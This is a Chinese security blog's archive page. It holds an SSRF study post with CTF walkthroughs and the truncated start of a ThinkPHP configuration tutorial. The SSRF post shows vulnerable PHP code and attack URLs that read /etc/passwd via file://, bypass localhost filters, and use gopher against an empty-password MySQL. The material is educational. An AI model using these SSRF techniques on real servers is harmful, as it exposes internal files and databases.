<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  

  
  <title>可乐&#39;blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="只会复现的菜鸡">
<meta property="og:type" content="website">
<meta property="og:title" content="可乐&#39;blog">
<meta property="og:url" content="https://style-404.github.io/page/3/index.html">
<meta property="og:site_name" content="可乐&#39;blog">
<meta property="og:description" content="只会复现的菜鸡">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="可乐&#39;blog">
<meta name="twitter:description" content="只会复现的菜鸡">
  
    <link rel="alternate" href="/atom.xml" title="可乐&#39;blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">可乐&#39;blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://style-404.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-SSRF学习" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/24/SSRF学习/" class="article-date">
  <time datetime="2019-03-24T15:18:09.000Z" itemprop="datePublished">2019-03-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/24/SSRF学习/">SSRF学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<p>注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g165ua5y17j30nh0e53zv.jpg" alt=""></p>
<p>SSRF到反射XSS<br>尝试利用URL访问内部资源并使服务器执行操作<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">file:</span><span class="comment">///</span></span><br><span class="line"><span class="symbol">dict:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">gopher:</span><span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
<p>我们可以扫描内部网络和端口<br>如果它在云实例上运行，则尝试获取元数据</p>
<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">'url'</span>];</span><br><span class="line"><span class="variable">$info</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="regexp">//</span>假设www.site.com为白名单网站</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$info</span>[<span class="string">'host'</span>] != <span class="string">'www.baidu.com'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    echo <span class="string">'目标网址不合法'</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ch</span> = curl_init();</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="variable">$data</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line">echo <span class="variable">$data</span>;</span><br></pre></td></tr></table></figure>
<p>上面这段代码我们知道，主要是进行网址过滤，如果用户输入的网址不是公司的网址，则服务器不会发起请求。<br>这段代码的目的是，防止用户输入其它恶意数据，造成攻击，比如：<br><a href="http://www.site.com/test.php?url=http://10.0.0.16" target="_blank" rel="noopener">http://www.site.com/test.php?url=http://10.0.0.16</a> –攻击者尝试内网漫游<br><a href="http://www.site.com/test.php?url=http://www.hack.com" target="_blank" rel="noopener">http://www.site.com/test.php?url=http://www.hack.com</a> –攻击者引导服务器访问不合法网址<br>新人写代码往往对一些函数并不是了解很深入，这段代码忽视了两个问题：</p>
<ol>
<li>parse_url原理是什么？<br>parse_url只是负责字符串解析，它不保证你的协议真伪，这里我们不用http协议，而使用一个根本不存在的协议abc测试：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$url = <span class="string">'http://www.baidu.com/test'</span>;</span></span><br><span class="line"><span class="php">$info = parse_url($url);</span></span><br><span class="line"><span class="php">var_dump($info);</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1alni59d8j30cd054746.jpg" alt=""><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$url = <span class="string">'abc://www.baidu.com/test'</span>;</span></span><br><span class="line"><span class="php">$info = parse_url($url);</span></span><br><span class="line"><span class="php">var_dump($info);</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1aloes9ghj30dk04r3ye.jpg" alt=""></p>
<ol start="2">
<li>curl支持哪些协议？<br>curl是基于libcurl实现的，支持的协议非常多。<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libcurl supports HTTPS certificates, HTTP POST, HTTP PUT, FTP uploading, Kerberos, SPNEGO, HTTP form based upload, proxies, cookies, user+password authentication, file transfer resume, http<span class="built_in"> proxy </span>tunneling <span class="keyword">and</span> more</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>那么问题来了，我们回到最开始那个代码，我们可以发现存在两处问题：</p>
<ol>
<li>白名单只是检测了host，而没有检测协议。</li>
<li>curl除了支持http协议，还支持file协议。</li>
</ol>
<p><a href="http://www.site.com/test.php?url=file://www.site.com/etc/passwd" target="_blank" rel="noopener">http://www.site.com/test.php?url=file://www.site.com/etc/passwd</a></p>
<p>php curl识别出来这是个file协议，他会忽略<a href="http://www.site.com，而是直接读取文件/etc/passwd。" target="_blank" rel="noopener">www.site.com，而是直接读取文件/etc/passwd。</a></p>
<p>dict协议应用<br>dict协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，但是在SSRF中如果可以使用dict协议那么就可以轻易的获取目标服务器端口上运行的服务版本等信息。</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>LCTF的一道SSRF签到题</p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1al3w4pbaj30gy04lmxh.jpg" alt=""></p>
<p>输入baidu.com  返回了源码 可见是调用curl 命令</p>
<p>尝试用file 协议读取文件<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1am35xhzsj30ia05mmxy.jpg" alt=""><br>后端代码会给我们提交的url内容在最后加一个／，需要通过？或者#的方法截断 需要进行url编码直接传#是会拼接成 /etc/passwd#/ 整体作为一个path<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1am6i39etj30j105m76b.jpg" alt=""><br>接着读取 flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1am85bx7bj30gf04laax.jpg" alt=""><br>随便读一下源码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span><span class="keyword">if</span>(!$_GET[<span class="string">'site'</span>])&#123; <span class="keyword">echo</span> &lt;&lt;&lt;EOF &lt;html&gt; &lt;body&gt; look source code: &lt;form action=<span class="string">''</span> method=<span class="string">'GET'</span>&gt; &lt;input type=<span class="string">'submit'</span> name=<span class="string">'submit'</span> /&gt;&lt;input type=<span class="string">'text'</span> name=<span class="string">'site'</span> style=<span class="string">"width:1000px"</span> value=<span class="string">"https://www.baidu.com"</span>/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; EOF; <span class="keyword">die</span>(); &#125;</span></span><br><span class="line"><span class="php">$url = $_GET[<span class="string">'site'</span>]; $url_schema = parse_url($url);</span></span><br><span class="line"><span class="php">$host = $url_schema[<span class="string">'host'</span>];</span></span><br><span class="line"><span class="php">$request_url = $url.<span class="string">"/"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($host !== <span class="string">'www.baidu.com'</span>)&#123; <span class="keyword">die</span>(<span class="string">"wrong site"</span>); &#125;</span></span><br><span class="line"><span class="php">$ci = curl_init();</span></span><br><span class="line"><span class="php">curl_setopt($ci, CURLOPT_URL, $request_url);</span></span><br><span class="line"><span class="php">curl_setopt($ci, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span></span><br><span class="line"><span class="php"> $res = curl_exec($ci);</span></span><br><span class="line"><span class="php">curl_close($ci);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($res)&#123; <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Source Code:&lt;/h1&gt;"</span>; <span class="keyword">echo</span> $request_url; <span class="keyword">echo</span> <span class="string">"&lt;hr /&gt;"</span>; <span class="keyword">echo</span> htmlentities($res); &#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">"get source failed"</span>; &#125; <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>平安科技的一道CTF<br>看到有参数为url 猜测是一道SSRF<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bsq6l2jxj30j10740to.jpg" alt=""><br>尝试访问flag_file.php 弹出<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bsrqdgtzj30hz04c3zf.jpg" alt=""><br>直接使用127.0.0.1 不行，可能做了关键字过滤<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bssc5zo6j30fw04c758.jpg" alt=""><br>把127.0.0.1转成整数或者localhost，成功拿到flag</p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bssxuyczj30g7041jsa.jpg" alt=""></p>
<p>第二届XCTF<br>Web400-百度内网漫游<br>题目给了一篇wooyun文章，通过查看得知是ssrf，随意在搜索框输入，返回百度的内容。<br>抓包，发现有一个link参数，根据ssrf的特性，确认此处存在ssrf漏洞。<br>于是我们要做的就是利用这个参数去访问其内网，但是经过测试发现，其过滤了IP，于是在自己的vps上放了一个302跳转：<br>利用跳转来访问内网<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1btni4rg0j30zt0aewhm.jpg" alt=""><br>访问这个css文件<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1btog0m5mj30ut0bqtel.jpg" alt=""><br>得到内网的域名,接下来访问这个内网域名<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1btpefn7bj30uh0cfadp.jpg" alt=""><br>点了下导航栏下面的图片，直接给跳回去，但是发现地址栏多了一些东西，看到src，以及online几个参数，</p>
<h1 id="通过gopher发送post数据包"><a href="#通过gopher发送post数据包" class="headerlink" title="通过gopher发送post数据包"></a>通过gopher发送post数据包</h1><h1 id="通过gopher攻击内网数据库"><a href="#通过gopher攻击内网数据库" class="headerlink" title="通过gopher攻击内网数据库"></a>通过gopher攻击内网数据库</h1><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>2018  ISITDTU 的一道CTF<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g19dh7bspwj30ki048t8j.jpg" alt=""></p>
<p>能够看出来是一道SSRF<br>于是利用file:// 读一下文件 输入file:///etc/passwd<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g19dir17yuj30p405ct90.jpg" alt=""><br>可以看到后台判断了服务器是否为localhost，所以我们通过file://localhost/etc/passwd即可绕过限制。这里我们尝试读题目源码file://localhost/var/www/html/index.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include_once</span> <span class="string">"config.php"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])&amp;&amp;!<span class="keyword">empty</span>($_POST[<span class="string">'url'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $url = $_POST[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php">    $content_url = getUrlContent($url);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $content_url = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>再读一下config.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$hosts = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$dbusername = <span class="string">"ssrf_user"</span>;</span></span><br><span class="line"><span class="php">$dbpasswd = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"ssrf"</span>;</span></span><br><span class="line"><span class="php">$dbport = <span class="number">3306</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">initdb</span><span class="params">($conn)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $dbinit = <span class="string">"create table if not exists flag(secret varchar(100));"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(mysqli_query($conn,$dbinit)) <span class="keyword">return</span> <span class="number">1</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($url)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $tmpurl = parse_url($url, PHP_URL_HOST);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($tmpurl != <span class="string">"localhost"</span> <span class="keyword">and</span> $tmpurl != <span class="string">"127.0.0.1"</span>)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        var_dump($tmpurl);</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"&lt;h1&gt;Only access to localhost&lt;/h1&gt;"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $url;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">getUrlContent</span><span class="params">($url)</span></span>&#123;</span></span><br><span class="line"><span class="php">    $url = safe($url);</span></span><br><span class="line"><span class="php">    $url = escapeshellarg($url);</span></span><br><span class="line"><span class="php">    $pl = <span class="string">"curl "</span>.$url;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $pl;</span></span><br><span class="line"><span class="php">    $content = shell_exec($pl);</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $content;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">initdb($conn);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>在数据库中且给出了我们一个空密码的mysql账户<br>gopher协议的主要功能是可以直接发起socket连接获取数据，而且由于mysql这里给出的密码是空密码，因此可以通过gopher发起sql请求来获取数据。</p>
<p>帮助生成gopher攻击mysql的payload</p>
<p><a href="https://github.com/style-404/mysql_gopher_attack" target="_blank" rel="noopener">https://github.com/style-404/mysql_gopher_attack</a></p>
<h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p>2016Hctf的一道题</p>
<p>hackme上一道的一道XSS加ssrf</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/4420#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/4420#toc-4</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/24/SSRF学习/" data-id="cjvrp4glc002h5gqrosmqra15" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-thinnkphp学习" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/23/thinnkphp学习/" class="article-date">
  <time datetime="2019-03-23T14:26:50.000Z" itemprop="datePublished">2019-03-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/23/thinnkphp学习/">thinnkphp学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>#安装与配置</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>我们现在开始学习ThinkPHP第一步：设置ThinkPHP。一个框架的原始模样可能无法满足你的开发需求，但你可以通过设置来满足。在学习ThinkPHP的配置的时候，首先要明白：ThinkPHP框架中所有配置文件的定义格式都是采用返回PHP数组的方式来定义的。</p>
<p>我们最常操作的是应用配置，默认的就是在Application/Common/Conf/config.php文件中：<br><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">return <span class="built_in">array</span>(</span><br><span class="line">    <span class="symbol">'URL_ROUTER_ON'</span>   =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="symbol">'URL_ROUTE_RULES'</span>=&gt;<span class="built_in">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="symbol">'blogs</span>/:id'               =&gt; <span class="built_in">array</span>(<span class="symbol">'Index</span>/read'),</span><br><span class="line">    <span class="symbol">'article</span>/:id'               =&gt; <span class="built_in">array</span>(<span class="symbol">'Article</span>/show')</span><br><span class="line">),</span><br><span class="line">    <span class="symbol">'URL_MAP_RULES'</span>=&gt;<span class="built_in">array</span>(</span><br><span class="line">    <span class="symbol">'new</span>/top' =&gt; <span class="symbol">'Index</span>/top?<span class="keyword">type</span>=top'</span><br><span class="line">),</span><br><span class="line"></span><br><span class="line">    <span class="symbol">'DB_TYPE'</span>               =&gt;  <span class="symbol">'mysql'</span>,</span><br><span class="line">    <span class="symbol">'DB_HOST'</span>               =&gt;  <span class="symbol">'localhost'</span>,</span><br><span class="line">    <span class="symbol">'DB_NAME'</span>               =&gt;  <span class="symbol">'think'</span>,</span><br><span class="line">    <span class="symbol">'DB_USER'</span>               =&gt;  <span class="symbol">'root'</span>,</span><br><span class="line">    <span class="symbol">'DB_PWD'</span>                =&gt;  <span class="string">''</span>,</span><br><span class="line">    <span class="symbol">'DB_PORT'</span>               =&gt;  <span class="string">'3306'</span>,</span><br><span class="line">    <span class="symbol">'DB_PREFIX'</span>             =&gt;  <span class="symbol">'think_'</span>,</span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>说明：ThinkPHP的配置参数（一级参数）是不区分大小写的，因为不管大写小写，最后都会转为小写。但是为了在编程的过程中更符合规范，建议统一使用大写来设置配置参数。上面的第一个配置URL_ROUTER_ON，我们开启了路由重写功能，为后面的 URL_ROUTE_RULES 奠定基础（详细的后面我们会在路由章节说到）。最后几个带DB_的设置项是表示设置连接数据库的参数，几乎每一个web应用都会用到数据库，这些设置为我们后续进一步学习的基础。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="keyword">return</span> <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php">    <span class="string">'USER_CONFIG'</span>        =&gt; <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php">        <span class="string">'USER_AUTH'</span> =&gt; <span class="keyword">true</span>,</span></span><br><span class="line"><span class="php">        <span class="string">'USER_TYPE'</span> =&gt; <span class="number">2</span>,</span></span><br><span class="line"><span class="php">    ),</span></span><br><span class="line"><span class="php">);</span></span><br></pre></td></tr></table></figure></p>
<p>如上面的USER_CONFIG下的USER_AUTH和USER_TYPE是区分大小写的。 这个只是示例，如果在项目中真的需要二级配置，请区分大小写，这些配置也是在Application/Common/Conf/config.php中配置的。</p>
<p>了解了ThinkPHP的配置格式后，我们再看看ThinkPHP的配置加载顺序，理解配置项的加载顺序在开发的时候很重要，因为在同名的配置下，后加载的配置会覆盖前面加载的顺序，而生效的只有后加载的顺序。</p>
<p>惯例配置-&gt;应用配置-&gt;模式配置-&gt;调试配置-&gt;状态配置-&gt;模块配置-&gt;扩展配置-&gt;动态配置</p>
<p>上面的顺序就是ThinkPHP的配置加载顺序，而在一般情况下，这些配置都是自动加载的。我们最常操作的是应用配置，默认的就是在Application/Common/Conf/config.php文件中。在开发的时候我们可以在这里设置自己的配置，如果你不熟悉你可以配置什么值，你可以打开ThinkPHP/Conf/convention.php文件来查看相对应的配置项</p>
<p>读取配置<br>在开发的过程中，我们有时候需要读取应用的配置值，在ThinkPHP中统一使用C(‘配置参数名’)来读取配置。比如：<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$model = C(<span class="string">'URL_MODEL'</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$model = C(<span class="string">'url_model'</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>这两个是等效的，都是可以读取到系统的URL访问模式的设置值，因为在ThinkPHP的配置项是不分大小写的。但是建议统一使用大写方式。</p>
<p>可以利用config首字母来记忆C()方法。</p>
<h2 id="课后习题"><a href="#课后习题" class="headerlink" title="课后习题"></a>课后习题</h2><p>查看ThinkPHP/Conf/convention.php的内容，对其中的配置项进行初步了解<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span 